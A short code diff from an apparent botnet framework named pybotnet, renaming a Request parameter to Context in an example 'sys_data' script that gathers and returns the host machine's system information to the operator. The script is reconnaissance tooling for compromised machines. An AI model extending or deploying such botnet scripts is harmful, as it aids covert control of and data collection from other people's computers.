@@ -1,5 +1,5 @@
 from pybotnet import ExternalScripts
-from pybotnet.request import Request
+from pybotnet.context import Context
 
 # example external scripts
 
@@ -17,10 +17,10 @@ def hello_world():
 
 
 @external_botnet.add_script(script_name='sys_data', script_version="0.1.0")
-def get_system_info(request: Request):
+def get_system_info(context: Context):
     """return system_info"""
     sys_data = ""
-    for key, value in request.system_info().items():
+    for key, value in context.system_info().items():
         sys_data += f"{key}: {value}\n"
     return sys_data
 
